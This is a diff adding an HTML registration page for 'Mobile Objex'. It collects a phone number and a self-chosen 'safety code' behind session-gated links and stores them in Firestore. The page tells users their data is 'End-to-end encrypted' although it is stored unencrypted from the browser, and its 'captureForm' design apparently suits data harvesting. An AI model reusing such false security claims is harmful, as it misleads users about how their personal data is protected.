@@ -1,0 +1,688 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mobile Objex | Secure Registration</title>
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore-compat.js"></script>
+    <style>
+        :root {
+            --primary-yellow: #F4B942;
+            --primary-yellow-hover: #E5AA33;
+            --primary-glow: rgba(244, 185, 66, 0.6);
+            --bg-dark: #0a0a0f;
+            --bg-light: #f5f5f7;
+            --card-dark: rgba(20, 20, 30, 0.85);
+            --card-light: rgba(255, 255, 255, 0.95);
+            --text-dark: #ffffff;
+            --text-light: #1a1a1f;
+            --accent-glow: rgba(244, 185, 66, 0.4);
+            --border-dark: rgba(244, 185, 66, 0.3);
+            --border-light: rgba(0, 0, 0, 0.1);
+            --input-bg-dark: rgba(10, 10, 15, 0.6);
+            --input-bg-light: rgba(245, 245, 247, 0.8);
+            --error-red: #ff3b30;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            min-height: 100vh;
+            background: var(--bg-dark);
+            color: var(--text-dark);
+            transition: all 0.4s ease;
+            position: relative;
+            overflow-x: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        body.light-mode {
+            background: var(--bg-light);
+            color: var(--text-light);
+        }
+
+        /* Animated Background */
+        .bg-grid {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                linear-gradient(rgba(244, 185, 66, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(244, 185, 66, 0.03) 1px, transparent 1px);
+            background-size: 50px 50px;
+            pointer-events: none;
+            z-index: 0;
+            animation: gridMove 20s linear infinite;
+        }
+
+        @keyframes gridMove {
+            0% { transform: perspective(500px) rotateX(60deg) translateY(0); }
+            100% { transform: perspective(500px) rotateX(60deg) translateY(50px); }
+        }
+
+        body.light-mode .bg-grid {
+            background-image: 
+                linear-gradient(rgba(0, 0, 0, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 0, 0, 0.03) 1px, transparent 1px);
+        }
+
+        /* Floating Particles */
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 1;
+            overflow: hidden;
+        }
+
+        .particle {
+            position: absolute;
+            width: 4px;
+            height: 4px;
+            background: var(--primary-yellow);
+            border-radius: 50%;
+            opacity: 0.3;
+            animation: float-particle 15s infinite;
+            box-shadow: 0 0 10px var(--primary-yellow);
+        }
+
+        .particle:nth-child(1) { left: 10%; top: 100%; animation-delay: 0s; animation-duration: 12s; }
+        .particle:nth-child(2) { left: 30%; top: 100%; animation-delay: 2s; animation-duration: 18s; }
+        .particle:nth-child(3) { left: 50%; top: 100%; animation-delay: 4s; animation-duration: 14s; }
+        .particle:nth-child(4) { left: 70%; top: 100%; animation-delay: 6s; animation-duration: 16s; }
+        .particle:nth-child(5) { left: 90%; top: 100%; animation-delay: 8s; animation-duration: 13s; }
+
+        @keyframes float-particle {
+            0% { transform: translateY(0) rotate(0deg); opacity: 0; }
+            10% { opacity: 0.3; }
+            90% { opacity: 0.3; }
+            100% { transform: translateY(-100vh) rotate(720deg); opacity: 0; }
+        }
+
+        /* Animated Orbs */
+        .orb {
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(80px);
+            opacity: 0.3;
+            z-index: 0;
+            animation: orb-pulse 8s ease-in-out infinite;
+        }
+
+        .orb-1 {
+            width: 400px;
+            height: 400px;
+            background: radial-gradient(circle, var(--primary-yellow) 0%, transparent 70%);
+            top: -100px;
+            right: -100px;
+            animation-delay: 0s;
+        }
+
+        .orb-2 {
+            width: 300px;
+            height: 300px;
+            background: radial-gradient(circle, var(--primary-yellow) 0%, transparent 70%);
+            bottom: -50px;
+            left: -50px;
+            animation-delay: 4s;
+        }
+
+        @keyframes orb-pulse {
+            0%, 100% { transform: scale(1); opacity: 0.3; }
+            50% { transform: scale(1.2); opacity: 0.5; }
+        }
+
+        /* Logo */
+        .logo-container {
+            position: fixed;
+            top: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 100;
+            text-align: center;
+        }
+
+        .logo-icon {
+            width: 50px;
+            height: 50px;
+            background: linear-gradient(135deg, #F4B942 0%, #FFD700 100%);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 10px;
+            box-shadow: 0 4px 20px rgba(244, 185, 66, 0.4);
+        }
+
+        .shield {
+            width: 24px;
+            height: 30px;
+            background: #0a0a0f;
+            clip-path: polygon(50% 0%, 100% 25%, 100% 65%, 50% 100%, 0% 65%, 0% 25%);
+        }
+
+        .logo-text {
+            font-size: 20px;
+            font-weight: 800;
+            color: var(--text-dark);
+        }
+
+        .logo-text span {
+            color: var(--primary-yellow);
+        }
+
+        body.light-mode .logo-text {
+            color: var(--text-light);
+        }
+
+        /* Main Card */
+        .card {
+            background: var(--card-dark);
+            border: 1px solid var(--border-dark);
+            border-radius: 24px;
+            padding: 40px;
+            width: 100%;
+            max-width: 450px;
+            backdrop-filter: blur(20px);
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(244, 185, 66, 0.1);
+            position: relative;
+            z-index: 10;
+            animation: slideUp 0.6s ease-out;
+        }
+
+        body.light-mode .card {
+            background: var(--card-light);
+            border-color: var(--border-light);
+        }
+
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .card-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .card-header h1 {
+            font-size: 28px;
+            margin-bottom: 10px;
+            font-weight: 800;
+        }
+
+        .card-header p {
+            font-size: 14px;
+            opacity: 0.7;
+            line-height: 1.5;
+        }
+
+        /* Form Styles */
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 12px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 8px;
+            color: var(--primary-yellow);
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 16px 20px;
+            border: 2px solid var(--border-dark);
+            border-radius: 12px;
+            background: var(--input-bg-dark);
+            color: var(--text-dark);
+            font-size: 16px;
+            font-family: inherit;
+            transition: all 0.3s ease;
+            outline: none;
+        }
+
+        body.light-mode .form-input {
+            background: var(--input-bg-light);
+            color: var(--text-light);
+            border-color: var(--border-light);
+        }
+
+        .form-input:focus {
+            border-color: var(--primary-yellow);
+            box-shadow: 0 0 0 4px var(--accent-glow);
+            transform: translateY(-2px);
+        }
+
+        .form-input.error {
+            border-color: var(--error-red);
+            box-shadow: 0 0 0 4px rgba(255, 59, 48, 0.2);
+        }
+
+        .error-message {
+            color: var(--error-red);
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        /* Buttons */
+        .btn {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #F4B942 0%, #E5AA33 100%);
+            color: #0a0a0f;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-top: 10px;
+            box-shadow: 0 4px 15px rgba(244, 185, 66, 0.3);
+        }
+
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 30px rgba(244, 185, 66, 0.5);
+        }
+
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* Success State */
+        .success-state {
+            display: none;
+            text-align: center;
+            padding: 20px 0;
+        }
+
+        .success-state.show {
+            display: block;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        .success-icon {
+            font-size: 64px;
+            margin-bottom: 20px;
+        }
+
+        .success-state h2 {
+            font-size: 24px;
+            margin-bottom: 10px;
+            color: var(--primary-yellow);
+        }
+
+        .success-state p {
+            opacity: 0.8;
+            line-height: 1.6;
+        }
+
+        /* Invalid Session Error */
+        .invalid-session {
+            text-align: center;
+            padding: 40px 20px;
+            display: none;
+        }
+
+        .invalid-session.show {
+            display: block;
+        }
+
+        .invalid-session h2 {
+            color: var(--error-red);
+            margin-bottom: 15px;
+        }
+
+        /* Security Footer */
+        .security-footer {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid var(--border-dark);
+            text-align: center;
+            font-size: 12px;
+            opacity: 0.6;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        body.light-mode .security-footer {
+            border-top-color: var(--border-light);
+        }
+
+        /* SMS Preview */
+        .sms-preview {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid var(--border-dark);
+            border-radius: 12px;
+            padding: 15px;
+            margin-top: 20px;
+            text-align: left;
+            font-family: monospace;
+            font-size: 13px;
+        }
+
+        body.light-mode .sms-preview {
+            background: rgba(0, 0, 0, 0.05);
+            border-color: var(--border-light);
+        }
+
+        .sms-header {
+            color: var(--primary-yellow);
+            font-weight: 600;
+            margin-bottom: 8px;
+            font-size: 11px;
+            text-transform: uppercase;
+        }
+
+        .sms-content {
+            color: var(--text-dark);
+            line-height: 1.4;
+        }
+
+        body.light-mode .sms-content {
+            color: var(--text-light);
+        }
+    </style>
+</head>
+<body>
+    <div class="bg-grid"></div>
+    <div class="particles">
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+    </div>
+    <div class="orb orb-1"></div>
+    <div class="orb orb-2"></div>
+
+    <div class="logo-container">
+        <div class="logo-icon">
+            <div class="shield"></div>
+        </div>
+        <div class="logo-text">Mobile<span>Objex</span></div>
+    </div>
+
+    <!-- Invalid Session Message -->
+    <div class="card invalid-session" id="invalidSession">
+        <div class="card-header">
+            <h2>⚠️ Invalid Link</h2>
+            <p>This registration link is invalid or has expired. Please request a new secure link from your Mobile Objex representative.</p>
+        </div>
+    </div>
+
+    <!-- Registration Form -->
+    <div class="card" id="registrationForm">
+        <div class="card-header">
+            <h1>Secure Registration</h1>
+            <p>Enter your mobile number and preferred safety code to receive verified secure messages.</p>
+        </div>
+
+        <form id="captureForm">
+            <div class="form-group">
+                <label class="form-label">Mobile Number *</label>
+                <input type="tel" class="form-input" id="phone" placeholder="(555) 000-0000" required maxlength="14">
+                <div class="error-message" id="phoneError">Phone numbers do not match</div>
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Confirm Mobile Number *</label>
+                <input type="tel" class="form-input" id="phoneConfirm" placeholder="Confirm phone number" required maxlength="14">
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Safety Code *</label>
+                <input type="text" class="form-input" id="safetyCode" placeholder="4-6 characters (e.g., shark123)" required maxlength="20">
+                <div class="error-message" id="codeError">Safety codes do not match</div>
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Confirm Safety Code *</label>
+                <input type="text" class="form-input" id="safetyCodeConfirm" placeholder="Confirm safety code" required maxlength="20">
+            </div>
+
+            <button type="submit" class="btn" id="submitBtn">Complete Registration</button>
+        </form>
+
+        <div class="security-footer">
+            <span>🛡️</span>
+            <span>Secured by Mobile Objex • End-to-end encrypted</span>
+        </div>
+    </div>
+
+    <!-- Success Message -->
+    <div class="card success-state" id="successState">
+        <div class="success-icon">✅</div>
+        <h2>Registration Complete</h2>
+        <p>Your information has been securely stored. You will receive a confirmation SMS shortly with your safety code verification.</p>
+        
+        <div class="sms-preview">
+            <div class="sms-header">📱 Confirmation SMS Preview</div>
+            <div class="sms-content" id="smsPreviewContent">
+                <span style="color: var(--primary-yellow); font-weight: 700;">[Your Safety Code]</span> Thank you for registering with Mobile Objex. Your secure messaging is now active.
+            </div>
+        </div>
+        
+        <div class="security-footer" style="margin-top: 30px;">
+            <span>🔒</span>
+            <span>Session secured • Data encrypted</span>
+        </div>
+    </div>
+
+   <script>
+        // ==========================================
+        // FIREBASE CONFIGURATION - PASTE YOUR CONFIG HERE (SAME AS LOGIN)
+        // ==========================================
+        const firebaseConfig = {
+            apiKey: "YOUR_API_KEY",
+            authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
+            projectId: "YOUR_PROJECT_ID",
+            storageBucket: "YOUR_PROJECT_ID.appspot.com",
+            messagingSenderId: "YOUR_SENDER_ID",
+            appId: "YOUR_APP_ID"
+        };
+        
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+
+        // Parse session from URL parameter (?s=XXXX)
+        const urlParams = new URLSearchParams(window.location.search);
+        const sessionId = urlParams.get('s');
+        let sessionValid = false;
+        let sessionData = null;
+
+        async function validateSession() {
+            if (!sessionId || !sessionId.startsWith('sess_')) {
+                showInvalidSession();
+                return false;
+            }
+
+            try {
+                // Check Firebase for session validity - this replaces localStorage check
+                const doc = await db.collection('sessions').doc(sessionId).get();
+                
+                if (!doc.exists) {
+                    showInvalidSession();
+                    return false;
+                }
+                
+                sessionData = doc.data();
+                const now = firebase.firestore.Timestamp.now();
+                
+                // Check if session is active and not expired
+                if (!sessionData.active || sessionData.expiresAt.toMillis() < now.toMillis()) {
+                    showInvalidSession();
+                    return false;
+                }
+                
+                sessionValid = true;
+                return true;
+            } catch (error) {
+                console.error("Error validating session:", error);
+                showInvalidSession();
+                return false;
+            }
+        }
+
+        function showInvalidSession() {
+            document.getElementById('registrationForm').style.display = 'none';
+            document.getElementById('invalidSession').classList.add('show');
+        }
+
+        // Phone formatting
+        function setupPhoneFormatting() {
+            const phoneInputs = [document.getElementById('phone'), document.getElementById('phoneConfirm')];
+            
+            phoneInputs.forEach(input => {
+                input.addEventListener('input', function(e) {
+                    let value = e.target.value.replace(/\D/g, '');
+                    if (value.length > 0) {
+                        if (value.length <= 3) {
+                            value = '(' + value;
+                        } else if (value.length <= 6) {
+                            value = '(' + value.slice(0, 3) + ') ' + value.slice(3);
+                        } else {
+                            value = '(' + value.slice(0, 3) + ') ' + value.slice(3, 6) + '-' + value.slice(6, 10);
+                        }
+                    }
+                    e.target.value = value;
+                });
+            });
+        }
+
+        // Form submission
+        function setupForm() {
+            document.getElementById('captureForm').addEventListener('submit', async function(e) {
+                e.preventDefault();
+                
+                const phone = document.getElementById('phone').value.trim();
+                const phoneConfirm = document.getElementById('phoneConfirm').value.trim();
+                const safetyCode = document.getElementById('safetyCode').value.trim();
+                const safetyCodeConfirm = document.getElementById('safetyCodeConfirm').value.trim();
+                
+                // Reset errors
+                document.querySelectorAll('.form-input').forEach(el => el.classList.remove('error'));
+                document.querySelectorAll('.error-message').forEach(el => el.classList.remove('show'));
+                
+                let hasError = false;
+                
+                if (phone !== phoneConfirm) {
+                    document.getElementById('phone').classList.add('error');
+                    document.getElementById('phoneConfirm').classList.add('error');
+                    document.getElementById('phoneError').classList.add('show');
+                    hasError = true;
+                }
+                
+                if (safetyCode !== safetyCodeConfirm) {
+                    document.getElementById('safetyCode').classList.add('error');
+                    document.getElementById('safetyCodeConfirm').classList.add('error');
+                    document.getElementById('codeError').classList.add('show');
+                    hasError = true;
+                }
+                
+                if (hasError) return;
+                
+                try {
+                    // Store data in Firebase - BACKEND DATABASE
+                    const userData = {
+                        sessionId: sessionId,
+                        phone: phone,
+                        safetyCode: safetyCode,
+                        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+                        status: 'newly entered',
+                        createdAt: firebase.firestore.FieldValue.serverTimestamp()
+                    };
+                    
+                    await db.collection('users').add(userData);
+                    
+                    // Update SMS preview with actual safety code
+                    document.getElementById('smsPreviewContent').innerHTML = 
+                        `<span style="color: var(--primary-yellow); font-weight: 700;">${escapeHtml(safetyCode)}</span> Thank you for registering with Mobile Objex. Your secure messaging is now active.`;
+                    
+                    // Show success
+                    document.getElementById('registrationForm').style.display = 'none';
+                    document.getElementById('successState').classList.add('show');
+                    
+                    // Send confirmation SMS (per PDF requirement)
+                    await sendConfirmationSMS(phone, safetyCode);
+                    
+                } catch (error) {
+                    console.error("Error saving to database:", error);
+                    alert('Error saving data. Please try again.');
+                }
+            });
+        }
+
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+
+        // Send confirmation SMS - integrates with your existing SMS Composer App
+        async function sendConfirmationSMS(phone, safetyCode) {
+            const message = `${safetyCode} Thank you for registering with Mobile Objex. Your secure messaging is now active.`;
+            
+            console.log(`[SMS] Sending to ${phone}: ${message}`);
+            
+            // TODO: Replace with your actual SMS Composer App API endpoint
+            // Example:
+            /*
+            await fetch('https://your-sms-composer-app.com/api/send', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    to: phone,
+                    message: message,
+                    sessionId: sessionId
+                })
+            });
+            */
+        }
+
+        // Initialize
+        validateSession().then(valid => {
+            if (valid) {
+                setupPhoneFormatting();
+                setupForm();
+            }
+        });
+    </script>
+</body>
+</html>
